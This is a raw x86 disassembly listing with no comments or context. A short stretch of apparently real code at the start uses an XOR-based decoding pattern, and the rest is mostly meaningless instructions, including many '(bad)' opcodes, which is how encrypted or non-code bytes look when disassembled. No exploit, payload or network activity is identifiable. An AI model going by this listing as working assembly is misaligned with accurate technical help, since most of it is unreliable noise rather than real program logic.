  4081c6:	dec    ecx
  4081c7:	(bad)  
  4081c8:	iret   
  4081c9:	cmp    DWORD PTR [esp+eax*1-0x5b6ccf9a],edx
  4081d0:	pop    ds
  4081d1:	xor    esi,ecx
  4081d3:	call   0xe045:0x8904458d
  4081da:	je     0x40966c
  4081e0:	lea    eax,[ebp-0x18]
  4081e3:	push   eax
  4081e4:	mov    eax,DWORD PTR [ebp-0x2c]
  4081e7:	xor    eax,esi
  4081e9:	add    eax,edi
  4081eb:	push   eax
  4081ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4081ef:	xor    eax,esi
  4081f1:	add    eax,edi
  4081f3:	push   eax
  4081f4:	push   DWORD PTR [ebp-0x8]
  4081f7:	lea    eax,[ebp-0x78]
  4081fa:	push   eax
  4081fb:	push   DWORD PTR [ebp-0xc]
  4081fe:	push   DWORD PTR [ebp-0x14]
  408201:	call   0x406508
  408206:	test   eax,eax
  408208:	je     0x408233
  40820e:	lea    eax,[ebp-0x78]
  408211:	push   eax
  408212:	mov    eax,DWORD PTR [ebp-0x14]
  408215:	xor    eax,esi
  408217:	add    eax,edi
  408219:	push   eax
  40821a:	mov    eax,DWORD PTR [ebp-0x10]
  40821d:	add    eax,0xee
  408222:	push   eax
  408223:	mov    eax,DWORD PTR [ebp-0x10]
  408226:	mov    eax,DWORD PTR [eax+0x198]
  40822c:	push   DWORD PTR [eax]
  40822e:	call   0x4120bb
  408233:	mov    ecx,DWORD PTR [ebp-0x1c]
  408236:	xor    ecx,esi
  408238:	mov    eax,0xffcd8d64
  40823d:	sub    eax,ecx
  40823f:	sub    eax,DWORD PTR [ebp-0x8]
  408242:	mov    ecx,DWORD PTR [ebp-0x30]
  408245:	add    ecx,eax
  408247:	mov    eax,DWORD PTR [ebp-0x8]
  40824a:	mov    DWORD PTR [eax+0x1],ecx
  40824d:	mov    al,BYTE PTR [ebp-0x1]
  408250:	mov    ecx,DWORD PTR [ebp-0x8]
  408253:	xor    al,0x47
  408255:	sub    al,0x37
  408257:	jmp    0x4085a4
  40825c:	ja     0x408201
  40825e:	mov    ecx,0x7175496f
  408263:	mov    ds:0xd6da6ce9,eax
  408268:	outs   dx,BYTE PTR ds:[esi]
  408269:	sahf   
  40826a:	aas    
  40826b:	loope  0x4082a4
  40826d:	shl    BYTE PTR [eax+0x70],cl
  408270:	and    BYTE PTR [ebp+0x70],bh
  408273:	jo     0x408290
  408275:	pop    edi
  408276:	push   DWORD PTR [edx-0x33]
  408279:	or     DWORD PTR [edi-0x70],0xffffffc0
  40827d:	fsubr  QWORD PTR [edi-0x8]
  408280:	retf   
  408281:	push   cs
  408282:	mov    edx,0xf6124f11
  408287:	dec    esp
  408288:	dec    eax
  408289:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40828a:	das    
  40828b:	aam    0x44
  40828d:	or     DWORD PTR [ecx],0x7f82a233
  408293:	mov    ch,0x92
  408295:	mov    ecx,0xc05403cd
  40829a:	mov    dl,0xab
  40829c:	dec    esp
  40829d:	clc    
  40829e:	iret   
  40829f:	xchg   ecx,eax
  4082a0:	ret    0xc9ae
  4082a3:	mov    eax,0xa41caab6
  4082a8:	test   edx,0xbb62b838
  4082ae:	pushf  
  4082af:	dec    esi
  4082b0:	pop    ebx
  4082b1:	adc    eax,DWORD PTR [ebx]
  4082b3:	mov    ecx,0xca60b52c
  4082b8:	dec    ebp
  4082b9:	inc    eax
  4082ba:	jl     0x408294
  4082bc:	inc    edi
  4082bd:	mov    ds,WORD PTR [ecx-0x5614ccd9]
  4082c3:	dec    esp
  4082c4:	jle    0x4082f0
  4082c6:	xchg   ecx,eax
  4082c7:	push   0xffffffa1
  4082c9:	cmp    BYTE PTR [edx],bl
  4082cb:	arpl   WORD PTR [esi*8-0x33a7e0ec],si
  4082d2:	mov    ecx,0xa9540151
  4082d7:	push   ecx
  4082d8:	or     edi,DWORD PTR [ebp+0x47f71f0]
  4082de:	xor    ebx,DWORD PTR [edi+0x52008a19]
  4082e4:	jg     0x40829a
  4082e6:	xchg   esi,eax
  4082e7:	mov    eax,ds:0x19f0d8dc
  4082ec:	(bad)  [ecx+0x5]
  4082ef:	jo     0x40834e
  4082f1:	dec    edi
  4082f2:	cmp    DWORD PTR [ebp-0x7a],esp
  4082f5:	ds popf 
  4082f7:	and    DWORD PTR [eax+ecx*8-0x7b2034cf],esp
  4082fe:	pop    ebx
  4082ff:	sub    eax,0xd9589ba9
  408304:	xor    eax,DWORD PTR [esi]
  408306:	test   BYTE PTR [ecx+eiz*4],bl
  408309:	cs inc ebp
  40830b:	retf   
  40830c:	sub    BYTE PTR [edi+0xc],cl
  40830f:	stc    
  408310:	out    0x2f,al
  408312:	lea    esi,[ebx-0x23fdf02c]
  408318:	fldenv [eax]
  40831a:	or     eax,0x3e1790b8
  40831f:	xchg   ebp,eax
  408320:	sbb    BYTE PTR [edx+0xac9e784],dl
  408326:	mov    bh,0x8d
  408328:	int    0x2e
  40832a:	icebp  
  40832b:	dec    edi
  40832c:	sahf   
  40832d:	mov    ebp,0xc7001c7b
  408332:	out    dx,al
  408333:	inc    ebp
  408334:	mov    ah,0xa7
  408336:	jl     0x4082d6
  408338:	mov    edi,?
  40833a:	and    al,0x3c
  40833c:	add    al,0x7
  40833e:	add    ebp,DWORD PTR [ebp+0x6181b1d3]
  408344:	lds    eax,FWORD PTR [ebx-0x6a]
  408347:	shl    DWORD PTR [ebx-0x1c],0xbf
  40834b:	(bad)  
  40834c:	sbb    al,0x74
  40834e:	push   eax
  40834f:	aad    0x23
  408351:	pushf  
  408352:	pop    ebp
  408353:	ret    
  408354:	cwde   
  408355:	add    BYTE PTR [edi],bh
  408357:	xlat   BYTE PTR ds:[ebx]
  408358:	push   ebp
  408359:	xor    DWORD PTR [edi-0x5a65d14d],0x95d244f6
  408363:	test   al,0x3c
  408365:	sub    ecx,DWORD PTR [edx]
  408367:	daa    
  408368:	sbb    DWORD PTR [ebx-0x539471a5],edx
  40836e:	jl     0x40830d
  408370:	mov    eax,ds:0xf4351683
  408375:	nop
  408376:	into   
  408377:	or     al,0xa3
  408379:	(bad)  
  40837a:	mul    DWORD PTR [ebp+0x64]
  40837d:	mov    edx,0xd3ea831e
  408382:	or     al,0xf2
  408384:	adc    BYTE PTR [ecx-0x5c],bh
  408387:	sbb    BYTE PTR [ecx+0x5ac64c63],al
  40838d:	sub    ch,dl
  40838f:	test   ebp,esi
  408391:	aaa    
  408392:	sbb    al,BYTE PTR [edi]
  408394:	pop    ds
  408395:	mov    esi,0x185a2fd8
  40839a:	mov    esp,0x573ee0f1
  40839f:	xchg   esp,eax
  4083a0:	cmp    DWORD PTR [ebx+0x9],eax
  4083a3:	or     al,0x96
  4083a5:	sub    BYTE PTR [ebp+edi*1+0x6787d69a],0xe0
  4083ad:	mov    edx,0x5e8dfd15
  4083b2:	dec    esi
  4083b3:	mov    eax,ds:0x2274c4e
  4083b8:	pop    ecx
  4083b9:	into   
  4083ba:	sbb    BYTE PTR ds:0x631ddc41,bh
  4083c0:	pushf  
  4083c1:	pop    esp
  4083c2:	sbb    cl,BYTE PTR [ecx+0x1fcc18d2]
  4083c8:	and    esp,0x16
  4083cb:	stos   BYTE PTR es:[edi],al
  4083cc:	dec    esp
  4083cd:	outs   dx,DWORD PTR ds:[esi]
  4083ce:	shl    BYTE PTR [edx],1
  4083d0:	sahf   
  4083d1:	stos   DWORD PTR es:[edi],eax
  4083d2:	retf   
  4083d3:	call   edx
  4083d5:	mov    edx,0x8394fad5
  4083da:	fidivr DWORD PTR [ebx+0x75]
  4083dd:	out    0x8f,al
  4083df:	mov    cl,0x25
  4083e1:	and    ch,al
  4083e3:	in     al,0x28
  4083e5:	push   esi
  4083e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083e7:	leave  
  4083e8:	push   ss
  4083e9:	sahf   
  4083ea:	sar    DWORD PTR [bx],0xc2
  4083ee:	sub    edx,edx
  4083f0:	and    BYTE PTR [eax-0xb],ch
  4083f3:	push   eax
  4083f4:	sub    eax,0x532df5dc
  4083f9:	cld    
  4083fa:	cli    
  4083fb:	add    eax,0x326a6b19
  408400:	int3   
  408401:	mov    fs,WORD PTR [edi-0x328505d4]
  408407:	pop    ds
  408408:	or     BYTE PTR [ebx+ebx*1],al
  40840b:	cli    
  40840c:	les    esi,FWORD PTR [eax]
  40840e:	ror    BYTE PTR [ebx+0x4f],0xa8
  408412:	rcl    cl,0xa0
  408415:	cli    
  408416:	push   eax
  408417:	mov    al,0x1a
  408419:	sbb    eax,DWORD PTR [ecx-0x31]
  40841c:	add    DWORD PTR [edx+0x402fb6fc],0x6d
  408423:	fsubr  QWORD PTR [eax]
  408425:	adc    al,0xd3
  408427:	loopne 0x408401
  408429:	call   0xfc892bfb
  40842e:	aas    
  40842f:	jns    0x40846b
  408431:	les    ecx,FWORD PTR [eax+0x7f]
  408434:	ud2    
  408436:	in     eax,0x27
  408438:	sub    eax,0xc26275cf
  40843d:	jb     0x408470
  40843f:	xchg   edi,eax
  408440:	call   0xa6e4:0xcdecec52
  408447:	dec    ecx
  408448:	xchg   esp,eax
  408449:	data16 xor cl,BYTE PTR [esi]
  40844c:	fldcw  WORD PTR [eax-0x67ae46b6]
  408452:	mov    eax,ds:0x55bc8619
  408457:	mov    BYTE PTR [ecx],ch
  408459:	dec    edx
  40845a:	pushf  
  40845b:	out    0x31,eax
  40845d:	cmc    
  40845e:	cmp    eax,0xdb43ad7a
  408463:	int    0x11
  408465:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408466:	(bad)  
  408467:	mov    bl,0xfe
  408469:	hlt    
  40846a:	and    dh,BYTE PTR [edi]
  40846c:	adc    BYTE PTR [ecx-0x80],cl
  40846f:	stos   BYTE PTR es:[edi],al
  408470:	sub    al,0x3
  408472:	xchg   ebp,ebx
  408474:	shl    DWORD PTR ds:0x9bebe0d8,0x99
  40847b:	aam    0xdf
  40847d:	rcr    BYTE PTR [edi],0xab
  408480:	sub    DWORD PTR [ebp-0x62],eax
  408483:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408485:	jne    0x4084b7
  408487:	xchg   edx,eax
  408488:	or     ebx,DWORD PTR [edx]
  40848a:	inc    BYTE PTR [edi-0x673a22c5]
  408490:	add    edi,DWORD PTR [ebp+0x43]
  408493:	loop   0x4084e0
  408495:	add    BYTE PTR [eax-0x34],al
  408498:	cmc    
  408499:	outs   dx,DWORD PTR ds:[esi]
  40849a:	(bad)  
  40849c:	mov    dh,0xfd
  40849e:	addr16 jo 0x408458
  4084a1:	sbb    DWORD PTR [edi+ebx*8+0x1b],esp
  4084a5:	xchg   edx,eax
  4084a6:	sbb    eax,0x3eb33c2b
  4084ab:	imul   edx,DWORD PTR [ebx+edx*8],0x69
  4084af:	aaa    
  4084b0:	mov    ch,0x6a
  4084b2:	ror    BYTE PTR [eax-0x75],cl
  4084b5:	jg     0x408535
  4084b7:	fld    TBYTE PTR [ebx]
  4084b9:	cdq    
  4084ba:	xor    eax,0xae2d97fa
  4084bf:	shl    DWORD PTR ds:0x5079897c,0x33
  4084c6:	clc    
  4084c7:	fwait
  4084c8:	ins    DWORD PTR es:[edi],dx
  4084c9:	in     al,0x90
  4084cb:	jle    0x40852b
  4084cd:	push   edi
  4084ce:	pushf  
  4084cf:	cmp    edx,0x6a83b59a
  4084d5:	not    BYTE PTR [esi]
  4084d7:	shl    ebx,0x74
  4084da:	push   ebx
  4084db:	mov    ebx,0xd949170f
  4084e0:	lods   eax,DWORD PTR ds:[esi]
  4084e1:	xchg   esi,eax
  4084e2:	adc    bh,dl
  4084e4:	cld    
  4084e5:	neg    BYTE PTR [edi+0x4e]
  4084e8:	sbb    bh,al
  4084ea:	push   cs
  4084eb:	or     esi,DWORD PTR [eax]
  4084ed:	ss xchg esi,eax
  4084ef:	sbb    ebp,eax
  4084f1:	lods   al,BYTE PTR ds:[esi]
  4084f2:	iret   
  4084f3:	adc    BYTE PTR [ebx],ch
  4084f5:	repz call 0x3f54:0x65056422
  4084fd:	and    al,0xa8
  4084ff:	scas   eax,DWORD PTR es:[edi]
  408500:	fnstsw WORD PTR [ebp-0x1e]
  408503:	xchg   esp,eax
  408504:	xor    ebx,DWORD PTR [ebx+0x2730d5fe]
  40850a:	mov    bh,0x71
  40850c:	call   0x1294c6cd
  408511:	pop    edx
  408512:	and    eax,0x308ec3b5
  408517:	cmc    
  408518:	repnz ins DWORD PTR es:[edi],dx
  40851a:	and    al,BYTE PTR [ebx]
  40851c:	sbb    dh,0x50
  40851f:	shl    DWORD PTR [edi-0x66f0cb8a],cl
  408525:	hlt    
  408526:	or     BYTE PTR [ebp-0x5e],cl
  408529:	aaa    
  40852a:	fldcw  WORD PTR [ebp+0x5fee4c34]
  408530:	cvtdq2ps xmm0,XMMWORD PTR [eax]
  408533:	push   esi
  408534:	push   ebx
  408535:	mov    ebx,ebx
  408537:	js     0x408572
  408539:	shl    BYTE PTR [ecx-0xd6b82a8],1
  40853f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408540:	add    esp,ebx
  408542:	push   cs
  408543:	imul   DWORD PTR [ebx+0x4c01de62]
  408549:	loope  0x4085bb
  40854b:	jmp    0x4e9f:0x5e6b001d
  408552:	outs   dx,DWORD PTR ds:[esi]
  408553:	add    edx,edi
  408555:	mov    ?,WORD PTR [edx+0x58676e75]
  40855b:	jns    0x4085d2
  40855d:	loopne 0x4085b6
  40855f:	or     eax,0xf86ad6bd
  408564:	dec    esp
  408565:	mov    esp,0x99758799
  40856a:	push   ebx
  40856b:	mov    edx,0xb5788394
  408570:	fild   QWORD PTR [eax-0x177e31f3]
  408576:	push   ss
  408577:	xchg   ebp,eax
  408578:	sbb    al,0xa1
  40857a:	lds    eax,FWORD PTR [esi]
  40857c:	xor    eax,0x63e049a0
  408581:	cmp    BYTE PTR [ebp+0x11],bh
  408584:	mov    ecx,0xe015e970
  408589:	das    
  40858a:	test   eax,0xf5c6618c
  40858f:	adc    dl,dl
  408591:	popw   ss
  408593:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  408595:	xchg   edi,eax
  408596:	sbb    eax,0xa3d5c752
  40859b:	rol    ch,1
  40859d:	outs   dx,DWORD PTR ds:[esi]
  40859e:	mov    DWORD PTR [esi],0xa2fcb048
  4085a4:	mov    BYTE PTR [ecx],al
  4085a6:	jmp    0x4088f3
  4085ab:	inc    edi
  4085ac:	cli    
  4085ad:	fisttp DWORD PTR [edx+0x517569e1]
  4085b3:	jp     0x40858b
  4085b5:	xchg   ecx,eax
  4085b6:	mov    edx,0xf7126b0e
  4085bb:	out    0xdf,eax
  4085bd:	jo     0x40862f
  4085bf:	and    BYTE PTR [ebp+0x70],bh
  4085c2:	jo     0x4085ce
  4085c4:	mul    BYTE PTR [ebp-0x6b0c9f46]
  4085ca:	push   esi
  4085cb:	dec    ebx
  4085cc:	mov    ch,ah
  4085ce:	fcomp  st(6)
  4085d0:	push   ebp
  4085d1:	test   DWORD PTR [edx-0x61],0xb0c463e4
  4085d8:	xchg   ebp,eax
  4085d9:	xchg   DWORD PTR [ebx+0x63],ebx
  4085dc:	sbb    DWORD PTR [ecx],edi
  4085de:	jge    0x408619
  4085e0:	inc    esp
  4085e1:	cwde   
  4085e2:	loopne 0x408598
  4085e4:	or     al,0x8d
  4085e6:	cmp    al,0x9b
  4085e8:	(bad)  
  4085e9:	and    dl,BYTE PTR [edx-0x5bd423b9]
  4085ef:	jae    0x4085d4
  4085f1:	push   ss
  4085f2:	aaa    
  4085f3:	dec    esp
  4085f4:	and    bh,BYTE PTR [ebx+0x61d5ee07]
  4085fa:	adc    BYTE PTR [edi],ah
  4085fc:	int3   
  4085fd:	in     al,dx
  4085fe:	pop    esp
  4085ff:	out    0x6c,al
  408601:	sbb    DWORD PTR ds:0x845afd1e,esi
  408607:	iret   
  408608:	pop    edi
  408609:	mov    edi,0x6ce05289
  40860e:	push   0x7aeb22a8
  408613:	cs cli 
  408615:	pop    edx
  408616:	mov    DWORD PTR [esi],ecx
  408618:	mov    eax,0xb2201a40
  40861d:	mov    cl,0x75
  40861f:	xchg   ebp,eax
  408620:	jbe    0x4085fe
  408622:	lds    esp,FWORD PTR [edi-0x1e]
  408625:	rcr    BYTE PTR [edi-0x39b479cb],1
  40862b:	enter  0x147f,0xdf
  40862f:	adc    esp,esi
  408631:	push   ebx
  408632:	mov    dl,0x47
  408634:	mov    bl,0x78
  408636:	div    DWORD PTR [ebx+0x3ae6a611]
  40863c:	out    0x6a,al
  40863e:	sbb    DWORD PTR [edx],0xd1ed3bc0
  408644:	jnp    0x4085de
  408646:	sub    DWORD PTR [eax-0x10],eax
  408649:	(bad)  
  40864a:	lahf   
  40864b:	xchg   ebx,eax
  40864c:	test   DWORD PTR [ebp+eiz*8-0x4b],ebp
  408650:	push   ss
  408651:	sbb    BYTE PTR [ebp-0x12f7710b],al
  408657:	mov    esp,0x89591745
  40865c:	push   esp
  40865d:	and    esp,eax
  40865f:	and    DWORD PTR [edx+eax*2+0x44da36ff],edx
  408666:	arpl   WORD PTR [ecx+0x2c53bde0],bp
  40866c:	lods   eax,DWORD PTR ds:[esi]
  40866d:	mov    edx,0x488855ca
  408672:	mov    ax,WORD PTR [esp+ebx*1+0x1f0fd4b2]
  40867a:	mov    al,0xe
  40867c:	lea    eax,[eax]
  40867e:	inc    edx
  40867f:	fcmovnbe st,st(4)
  408681:	(bad)  
  408682:	out    dx,al
  408683:	imul   edx
  408685:	jo     0x40861d
  408687:	push   edi
  408688:	pop    eax
  408689:	push   ds
  40868a:	fnstcw WORD PTR [eax]
  40868c:	cdq    
  40868d:	inc    esi
  40868e:	(bad)  
  40868f:	in     al,0x9e
  408691:	adc    DWORD PTR [esi],ecx
  408693:	out    dx,al
  408694:	fcmovne st,st(6)
  408696:	lods   al,BYTE PTR ds:[esi]
  408697:	nop
  408698:	stos   BYTE PTR es:[edi],al
  408699:	in     al,0xb8
  40869b:	mov    bl,0xe9
  40869d:	cmc    
  40869e:	pop    edi
  40869f:	sub    al,0x3
  4086a1:	mov    ch,0xec
  4086a3:	cmp    DWORD PTR [edi+edi*4+0x1b37e7c1],0x3
  4086ab:	repz jno 0x4086a5
  4086ae:	sar    DWORD PTR [edx-0x67],0xf
  4086b2:	jns    0x4086cb
  4086b4:	mov    BYTE PTR [edi+0x7c],al
  4086b7:	outs   dx,BYTE PTR ds:[esi]
  4086b8:	pop    es
  4086b9:	jle    0x4086f2
  4086bb:	dec    edx
  4086bc:	mov    bl,BYTE PTR [ebx-0x2f]
  4086bf:	adc    dl,BYTE PTR [edx-0x1e]
  4086c2:	daa    
  4086c3:	das    
  4086c4:	stos   DWORD PTR es:[edi],eax
  4086c5:	and    ch,bl
  4086c7:	mov    ch,0x83
  4086c9:	adc    eax,0x5f0b6a62
  4086ce:	jecxz  0x40867c
  4086d0:	iret   
  4086d1:	test   DWORD PTR [edi+0x48],edx
  4086d4:	je     0x408752
  4086d6:	fcmovne st,st(6)
  4086d8:	lds    esi,FWORD PTR [di]
  4086db:	or     eax,0xf0c1ea4a
  4086e0:	inc    edx
  4086e1:	retf   
  4086e2:	inc    ebp
  4086e3:	call   0x6724fbae
  4086e8:	popf   
  4086e9:	iret   
  4086ea:	xchg   ebp,eax
  4086eb:	mov    eax,ds:0x3557e566
  4086f0:	jg     0x40875e
  4086f2:	fst    st(3)
  4086f4:	jbe    0x4086eb
  4086f6:	int    0xda
  4086f8:	jmp    0xeb4fcf2b
  4086fd:	push   es
  4086fe:	fdiv   QWORD PTR [bp+di+0x1a8c]
  408703:	adc    DWORD PTR [ebp+0x70],ebp
  408706:	(bad)  
  408707:	mov    ebp,0x893a24b3
  40870c:	jmp    0xb76bdbea
  408711:	xor    DWORD PTR [ecx],edi
  408713:	jmp    0x7a26a341
  408718:	jg     0x4086ea
  40871a:	pop    ebx
  40871b:	and    esi,DWORD PTR [ebp-0x3a]
  40871e:	das    
  40871f:	ror    ecx,cl
  408721:	lods   al,BYTE PTR ds:[esi]
  408722:	ja     0x4086d1
  408724:	and    al,0xd2
  408726:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408727:	aam    0xd7
  408729:	sub    BYTE PTR [ecx+0x73],bh
  40872c:	frstor [eax]
  40872e:	adc    bh,BYTE PTR [eax+0x1]
  408731:	outs   dx,DWORD PTR ds:[esi]
  408732:	sbb    DWORD PTR [edx-0x6521a177],0xec8db3b0
  40873c:	push   ds
  40873d:	mov    eax,ds:0x3b35597a
  408742:	das    
  408743:	gs clc 
  408745:	adc    eax,0x525d1df7
  40874a:	push   es
  40874b:	and    ecx,esp
  40874d:	shl    BYTE PTR [ebx],1
  40874f:	in     al,dx
  408750:	add    al,BYTE PTR [edi]
  408752:	mov    ebp,0x6a7734bd
  408757:	mov    WORD PTR [ebp+0x38e6ab8d],ds
  40875d:	xor    eax,0x6936235b
  408762:	fimul  WORD PTR [eax]
  408764:	mov    cl,ah
  408766:	loope  0x408712
  408768:	ficom  DWORD PTR [esi+0x17357052]
  40876e:	jg     0x4087c7
  408770:	cli    
  408771:	jne    0x4087b9
  408773:	icebp  
  408774:	or     al,0x28
  408776:	fisttp DWORD PTR [ecx]
  408778:	push   0x7f
  40877a:	shr    DWORD PTR [esi+edi*2],cl
  40877d:	rcr    DWORD PTR [edx],0x9b
  408780:	aaa    
  408781:	xchg   ecx,eax
  408782:	push   esp
  408783:	xchg   edx,eax
  408784:	out    0xe8,al
  408786:	inc    ebp
  408787:	scas   ax,WORD PTR es:[edi]
  408789:	jmp    0x408806
  40878b:	es cld 
  40878d:	loop   0x408778
  40878f:	pop    esi
  408790:	data16 and al,0x6f
  408793:	nop
  408794:	and    BYTE PTR [ebx],0x17
  408797:	adc    al,0xf1
  408799:	cdq    
  40879a:	sbb    DWORD PTR [esi],ebp
  40879c:	mov    cl,al
  40879e:	out    dx,al
  40879f:	dec    edi
  4087a0:	sub    eax,0xb23240c7
  4087a5:	clc    
  4087a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087a7:	outs   dx,DWORD PTR ds:[esi]
  4087a8:	(bad)
  4087ac:	aas    
  4087ad:	xor    ah,al
  4087af:	jl     0x4087a5
  4087b1:	cmp    al,0x60
  4087b3:	sub    DWORD PTR [ecx],0x60
  4087b6:	call   0x14de90b9
  4087bb:	sub    DWORD PTR [edx+0x11cadfce],0x98b22d69
  4087c5:	or     BYTE PTR ds:0x521effb4,al
  4087cb:	adc    eax,0x3924ac2d
  4087d0:	jo     0x4087fd
  4087d2:	or     BYTE PTR [edx],dh
  4087d4:	xchg   esp,eax
  4087d5:	hlt    
  4087d6:	pop    ecx
  4087d7:	retf   
  4087d8:	sbb    edi,DWORD PTR [eax+0x47]
  4087db:	not    BYTE PTR [edx-0x7d]
  4087de:	push   cs
  4087df:	push   ebx
  4087e0:	cmp    al,bl
  4087e2:	pop    eax
  4087e3:	dec    eax
  4087e4:	cmp    al,0xc7
  4087e6:	(bad)
  4087ea:	push   cs
  4087eb:	in     eax,0x1f
  4087ed:	fisub  DWORD PTR [ecx]
  4087ef:	pushf  
  4087f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087f1:	(bad)  
  4087f2:	jns    0x40881d
  4087f4:	push   cs
  4087f5:	loope  0x408822
  4087f7:	mov    ?,WORD PTR [eax-0x59]
  4087fa:	data16 jbe 0x4087f1
  4087fd:	das    
  4087fe:	mov    ecx,0x2468a9cb
  408803:	sub    BYTE PTR [ecx+0x76],cl
  408806:	jae    0x408862
  408808:	push   esp
  408809:	mov    ecx,0x295c2b82
  40880e:	gs loop 0x4087df
  408811:	cmp    dh,BYTE PTR [edi+0x5]
  408814:	xchg   ebp,eax
  408815:	nop
  408816:	outs   dx,BYTE PTR ds:[esi]
  408817:	jl     0x408855
  408819:	clc    
  40881a:	aas    
  40881b:	pop    ebx
  40881c:	mov    WORD PTR [ebp+esi*4-0x512070c3],cs
  408823:	popf   
  408824:	add    eax,0xa76adca
  408829:	and    DWORD PTR [edi],ebx
  40882b:	idiv   BYTE PTR [ebx+0x50]
  40882e:	(bad)  
  40882f:	cli    
  408830:	adc    eax,0x89dc678f
  408835:	inc    eax
  408836:	shl    BYTE PTR [ecx],1
  408838:	sub    dh,0x9d
  40883b:	lahf   
  40883c:	cwde   
  40883d:	lock pop esp
  40883f:	retf   0x33c6
  408842:	add    ebx,DWORD PTR [ebx-0x1a]
  408845:	inc    esp
  408846:	mov    al,0x79
  408848:	scas   al,BYTE PTR es:[edi]
  408849:	push   ebp
  40884a:	(bad)  
  40884b:	xor    ch,dl
  40884d:	sar    DWORD PTR [edi],cl
  40884f:	into   
  408850:	mov    dl,0x42
  408852:	out    dx,eax
  408853:	jno    0x40882c
  408855:	jge    0x408897
  408857:	call   0x3175:0x64cc5b6f
  40885e:	pop    fs
  408860:	and    al,BYTE PTR [eax+0x42]
  408863:	dec    DWORD PTR [esi+esi*2+0x22dc214c]
  40886a:	cdq    
  40886b:	xor    ebx,DWORD PTR [edi+0x73]
  40886e:	adc    DWORD PTR ds:0x1edd2803,0xffffffaa
  408875:	or     eax,0x598043d6
  40887a:	jns    0x40883e
  40887c:	lock mov ds:0xd7614f76,eax
  408882:	sbb    eax,0xafdd8dc4
  408887:	cmp    DWORD PTR [ebp-0x1a21953],esi
  40888d:	ret    
  40888e:	arpl   WORD PTR [ecx],bp
  408890:	mov    ch,0xf8
  408892:	shl    DWORD PTR [edx+0xe],cl
  408895:	shl    BYTE PTR [esi+0x21],1
  408898:	jmp    0xb0fe5c25
  40889d:	int3   
  40889e:	ror    BYTE PTR [esi-0x4],0x5d
  4088a2:	xchg   ecx,eax
  4088a3:	cdq    
  4088a4:	jno    0x4088f2
  4088a6:	xchg   BYTE PTR [ebx],dl
  4088a8:	jmp    0x6e19:0x21a9b547
  4088af:	pop    dx
  4088b1:	loopne 0x40884e
  4088b3:	pop    ecx
  4088b4:	sub    eax,0xa86727d1
  4088b9:	aam    0x54
  4088bb:	jge    0x40891d
  4088bd:	mov    DWORD PTR [ebx+ebx*8+0x19],ebp
  4088c1:	mov    bl,0x8c
  4088c3:	pushf  
  4088c4:	stos   BYTE PTR es:[edi],al
  4088c5:	(bad)  
  4088c7:	hlt    
  4088c8:	xor    eax,0x5de38bfa
  4088cd:	rcr    BYTE PTR [eax],cl
  4088cf:	mov    edi,0x1a074507
  4088d4:	push   es
  4088d5:	add    al,bh
  4088d7:	adc    cl,ah
  4088d9:	popf   
  4088da:	test   DWORD PTR [edx],esi
  4088dc:	imul   edx,DWORD PTR ds:0x8a56ab53,0xffffffaa
  4088e3:	mov    ecx,edi
  4088e5:	rol    DWORD PTR [ecx+0x71f0d599],0xf0
  4088ec:	neg    DWORD PTR [edx+0x3a35c2ed]
  4088f2:	mov    ch,0x8d
  4088f4:	inc    ebp
  4088f5:	clc    
  4088f6:	inc    BYTE PTR [eax]
  4088f8:	inc    eax
  4088f9:	push   eax
  4088fa:	jmp    0x408c47
  4088ff:	mov    al,0x3c
  408901:	fwait
  408902:	xchg   ebx,eax
  408903:	fwait
  408904:	jae    0x40896e
  408906:	rol    DWORD PTR [ebp+0x6c435cff],cl
  40890c:	inc    edi
  40890d:	jmp    0x40889a
  40890f:	xchg   edi,eax
  408910:	fdiv   QWORD PTR [eax+0x70]
  408913:	and    BYTE PTR [ebp+0x70],bh
  408916:	jo     0x408908
  408918:	xchg   BYTE PTR [edx],dh
  40891a:	(bad)  
  40891b:	jae    0x4088f0
  40891d:	jl     0x408933
  40891f:	cli    
  408920:	shl    bl,cl
  408922:	sub    DWORD PTR [ecx+0x46b3bf7a],ecx
  408928:	push   edx
  408929:	push   es
  40892a:	mov    al,ds:0xbfbb0335
  40892f:	cs lock stos DWORD PTR es:[edi],eax
  408932:	mov    ah,0xc0
  408934:	pop    eax
  408935:	pop    esi
  408936:	pop    eax
  408937:	mov    ebp,0xb8b90d27
  40893c:	add    eax,0x2c0f9d5b
  408941:	jge    0x408961
  408943:	cmp    al,0x1a
  408945:	and    DWORD PTR [ebx+eax*2],esp
  408948:	(bad)  
  408949:	sub    bh,al
  40894b:	std    
  40894c:	inc    edi
  40894d:	inc    ebp
  40894e:	data16 adc bl,ah
  408951:	push   edi
  408952:	popf   
  408953:	xchg   ebx,eax
  408954:	jne    0x408980
  408956:	test   DWORD PTR [ebx-0x68f3e67f],edi
  40895c:	xchg   edx,eax
  40895d:	stos   BYTE PTR es:[edi],al
  40895e:	out    0x72,al
  408960:	mov    ch,0x7d
  408962:	mov    eax,ds:0xed2fd915
  408967:	std    
  408968:	mov    edi,0x7d919be7
  40896d:	fmul   QWORD PTR [eax-0x22]
  408970:	jge    0x4089ae
  408972:	pusha  
  408973:	or     al,0x42
  408975:	push   edi
  408976:	rol    DWORD PTR [ebp-0x45],cl
  408979:	sbb    bl,BYTE PTR [ecx]
  40897b:	inc    eax
  40897c:	push   0x232b8599
  408981:	rcl    DWORD PTR [esi-0x27c2309d],cl
  408987:	mov    bl,0x19
  408989:	dec    ebp
  40898a:	cmp    al,0x71
  40898c:	cmc    
  40898d:	add    cl,bl
  40898f:	mov    dl,al
  408991:	jne    0x4089ca
  408993:	mov    al,ds:0x616bf6bf
  408998:	lea    ebx,[ebx+0x52]
  40899b:	jnp    0x4089a0
  40899d:	push   cs
  40899e:	pop    edi
  40899f:	addr16 dec eax
  4089a1:	or     cl,cl
  4089a3:	xchg   edi,eax
  4089a4:	mov    DWORD PTR [edi+eiz*8-0x18],0xb5925f46
  4089ac:	jnp    0x4089ee
  4089ae:	loope  0x408935
  4089b0:	pop    DWORD PTR [ebx-0x27]
  4089b3:	jp     0x4089f1
  4089b5:	and    dh,ch
